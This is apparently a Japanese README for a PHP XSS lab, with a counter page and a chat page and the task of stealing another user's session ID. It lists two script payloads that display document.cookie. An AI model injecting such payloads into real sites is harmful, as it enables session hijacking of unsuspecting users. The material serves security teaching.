# PHP Session ID

XSSの課題サンプルです。

## Chrome Edit This Cookieプラグイン

https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=ja


## index.php

ボタンを押すと数字が増えます。楽しい！

## chat.php

おしゃべりできます。なんてエキサイティング！

## セキュリティ課題：他のユーザのSESSION IDを取得するには

### 不正なコード

```
<script>alert(document.cookie)</script>
```

```
<script>alert(document.cookie.split(";")[3])</script>
```
